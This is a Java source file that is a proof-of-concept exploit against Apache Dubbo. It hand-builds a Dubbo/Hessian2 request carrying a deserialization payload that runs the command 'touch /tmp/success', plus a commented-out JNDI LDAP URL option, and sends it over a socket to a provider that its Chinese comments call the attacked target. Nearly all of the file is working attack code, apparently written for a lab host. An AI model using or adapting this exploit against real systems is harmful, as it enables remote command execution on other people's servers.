package util;

import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;


import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;


public class TestBasicConsumer {
    public static String JNDI_URL = "ldap://192.168.26.164:1389/vmbl9p";
    public static Object payload()throws Exception{

        return new Tests("touch /tmp/success");

    }

    public static void main(String[] args) throws Exception{

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

// header.
        byte[] header = new byte[16];
// set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
// set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

// set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        out.writeUTF("2.0.2");
//todo 此处填写注册中心获取到的service全限定名、版本号、方法名
        // attachment
        out.writeUTF("com.example.api.DemoService");//provider的接口全限定名
        out.writeUTF("");//接口版本
        out.writeUTF("sayHello");//接口方法
        out.writeObject(payload());
//        out.writeObject(JNDI_URL);
        out.flushBuffer();

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

//todo 此处填写被攻击的dubbo服务提供者地址和端口
        Socket socket = new Socket("192.168.26.164", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}